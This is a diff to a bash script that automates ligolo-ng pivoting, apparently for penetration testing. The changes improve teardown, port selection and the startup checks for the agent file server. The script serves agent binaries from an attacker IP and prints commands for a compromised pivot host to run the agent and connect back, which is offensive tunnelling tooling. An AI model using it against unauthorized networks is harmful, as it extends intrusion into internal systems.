@@ -23,8 +23,12 @@ set -uo pipefail
 # never edit this script). Pre-scanned here because teardown runs before the main arg parser, and the
 # pid/serve state files are namespaced per interface so two concurrent pivots don't clobber each other.
 TUN_NAME="ligolo"
+TEARDOWN=0
 for ((_i=1; _i<=$#; _i++)); do
-    if [[ "${!_i}" == "--name" ]]; then _j=$((_i+1)); TUN_NAME="${!_j:-ligolo}"; fi
+    case "${!_i}" in
+        --name)     _j=$((_i+1)); TUN_NAME="${!_j:-ligolo}" ;;
+        --teardown) TEARDOWN=1 ;;
+    esac
 done
 PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-proxy-${TUN_NAME}.pid"
 SERVE_PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-serve-${TUN_NAME}.pid"
@@ -34,15 +38,15 @@ SERVE_PORT_DEFAULT=8080
 # ---------------------------------------------------------------------------
 # Teardown
 # ---------------------------------------------------------------------------
-if [[ "${1:-}" == "--teardown" ]]; then
+if [[ $TEARDOWN -eq 1 ]]; then
     echo "[*] Tearing down ligolo-ng TUN interface, proxy, and file server."
 
-    # Proxy (started via `exec sudo ...`, so root-owned -- an unprivileged kill returns EPERM and
-    # would silently "succeed" without stopping it, so route the kill through sudo unless already root).
+    # Proxy runs as root (started via `exec sudo ...`), so an unprivileged kill returns EPERM and would
+    # silently "succeed" without stopping it -- route the kill through sudo unless we are already root.
+    KILL_PREFIX=""
+    [[ $EUID -ne 0 ]] && command -v sudo >/dev/null 2>&1 && KILL_PREFIX="sudo"
     if [[ -f "$PID_FILE" ]]; then
         PID="$(cat "$PID_FILE")"
-        KILL_PREFIX=""
-        [[ $EUID -ne 0 ]] && command -v sudo >/dev/null 2>&1 && KILL_PREFIX="sudo"
         if [[ -n "$PID" ]] && $KILL_PREFIX kill -0 "$PID" 2>/dev/null; then
             echo "[*] Killing proxy process (pid $PID)"
             $KILL_PREFIX kill "$PID"
@@ -50,6 +54,12 @@ if [[ "${1:-}" == "--teardown" ]]; then
             echo "[*] No running proxy found for recorded pid ${PID:-<none>} -- probably already stopped."
         fi
         rm -f "$PID_FILE"
+    fi
+    # Belt-and-braces: the recorded PID is sudo's, and on older sudo (or a detached proxy) the SIGTERM
+    # may not reach the proxy child, orphaning it still bound to the listener. Sweep any that are left.
+    if command -v pgrep >/dev/null 2>&1 && pgrep -f 'proxy -selfcert -laddr' >/dev/null 2>&1; then
+        echo "[*] Sweeping a leftover ligolo proxy still holding the listener."
+        $KILL_PREFIX pkill -f 'proxy -selfcert -laddr' 2>/dev/null || true
     fi
 
     # Agent file server (unprivileged, ours).
@@ -113,10 +123,15 @@ while [[ $# -gt 0 ]]; do
             sed -n '2,19p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
         *)
             echo "[!] Unknown argument: $1" >&2
-            echo "    Usage: $0 [--route CIDR]... [--port N] [--serve [DIR]] | --teardown" >&2
+            echo "    Usage: $0 [--route CIDR]... [--port N] [--serve [DIR]] [--name IFACE] | --teardown [--name IFACE]" >&2
             exit 1 ;;
     esac
 done
+
+if ! [[ "$LISTEN_PORT" =~ ^[0-9]+$ ]] || (( LISTEN_PORT < 1 || LISTEN_PORT > 65535 )); then
+    echo "[!] --port must be a number between 1 and 65535 (got '$LISTEN_PORT')." >&2
+    exit 1
+fi
 
 # ---------------------------------------------------------------------------
 # Locate the proxy binary
@@ -191,14 +206,30 @@ if [[ $SERVE -eq 1 ]]; then
         if [[ ${#FOUND_AGENTS[@]} -eq 0 ]]; then
             echo "[!] --serve requested but no 'agent'/'agent.exe' found in '$SERVE_SRC_DIR' -- skipping the file server." >&2
         else
+            # Pick the first free port at/after the default, so a second concurrent --serve pivot gets
+            # its own port instead of silently colliding on 8080.
+            SERVE_PORT="$SERVE_PORT_DEFAULT"
+            for _p in $(seq "$SERVE_PORT_DEFAULT" $((SERVE_PORT_DEFAULT + 9))); do
+                if ! (exec 3<>"/dev/tcp/${ATTACKER_IP}/${_p}") 2>/dev/null; then SERVE_PORT="$_p"; break; fi
+            done
             SERVE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/ligolo-serve.XXXXXX")"
             for a in "${FOUND_AGENTS[@]}"; do cp "$a" "$SERVE_DIR/"; done
-            ( cd "$SERVE_DIR" && exec python3 -m http.server "$SERVE_PORT_DEFAULT" --bind "$ATTACKER_IP" ) \
+            ( cd "$SERVE_DIR" && exec python3 -m http.server "$SERVE_PORT" --bind "$ATTACKER_IP" ) \
                 >/dev/null 2>&1 &
-            echo "$!" > "$SERVE_PID_FILE"
-            echo "$SERVE_DIR" > "$SERVE_DIR_FILE"
-            SERVE_URL="http://${ATTACKER_IP}:${SERVE_PORT_DEFAULT}"
-            echo "[*] Serving $(printf '%s ' "${FOUND_AGENTS[@]##*/}")on $SERVE_URL  (stop with --teardown)"
+            _spid=$!
+            # Verify it actually came up: python's http.server exits instantly on a bad bind (port busy,
+            # unusable IP), and we must never print a working-looking URL for a server that never started.
+            sleep 0.4
+            if kill -0 "$_spid" 2>/dev/null; then
+                echo "$_spid" > "$SERVE_PID_FILE"
+                echo "$SERVE_DIR" > "$SERVE_DIR_FILE"
+                SERVE_URL="http://${ATTACKER_IP}:${SERVE_PORT}"
+                echo "[*] Serving $(printf '%s ' "${FOUND_AGENTS[@]##*/}")on $SERVE_URL  (stop with --teardown)"
+            else
+                echo "[!] Agent file server failed to start (port ${SERVE_PORT} busy, or can't bind ${ATTACKER_IP})." >&2
+                echo "    Proceeding without it -- transfer the agent to the pivot by your own means." >&2
+                rm -rf "$SERVE_DIR"
+            fi
         fi
     fi
 fi
@@ -217,7 +248,10 @@ if [[ -n "$SERVE_URL" ]]; then
 fi
 echo "Once the proxy below is listening, run this on the PIVOT HOST:"
 echo
-echo "  Linux :  /tmp/agent -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
+# If we served the agent, the download line above drops it at /tmp/agent; otherwise the operator placed
+# it themselves, so show the path-agnostic ./agent rather than guessing a location.
+AGENT_LINUX_PATH="./agent"; [[ -n "$SERVE_URL" ]] && AGENT_LINUX_PATH="/tmp/agent"
+echo "  Linux :  $AGENT_LINUX_PATH -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
 echo "  Windows: .\\agent.exe -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
 echo
 echo "Then, in the proxy console that starts below:"
@@ -244,6 +278,7 @@ echo "the second agent (no script edit needed); start it on that session."
 echo "=================================================================="
 echo
 echo "[*] Starting proxy on 0.0.0.0:${LISTEN_PORT} in the foreground -- Ctrl+C to stop, then '$0 --teardown'."
-# `exec` preserves this PID, so recording $$ records the proxy's own PID for teardown.
+# `exec` replaces this shell, so $$ becomes the PID of `sudo` (which forwards signals to its proxy child
+# on modern sudo). Teardown kills this PID, with a pkill sweep as a fallback for older sudo.
 echo "$$" > "$PID_FILE"
 exec sudo "$PROXY_BIN" -selfcert -laddr "0.0.0.0:${LISTEN_PORT}"
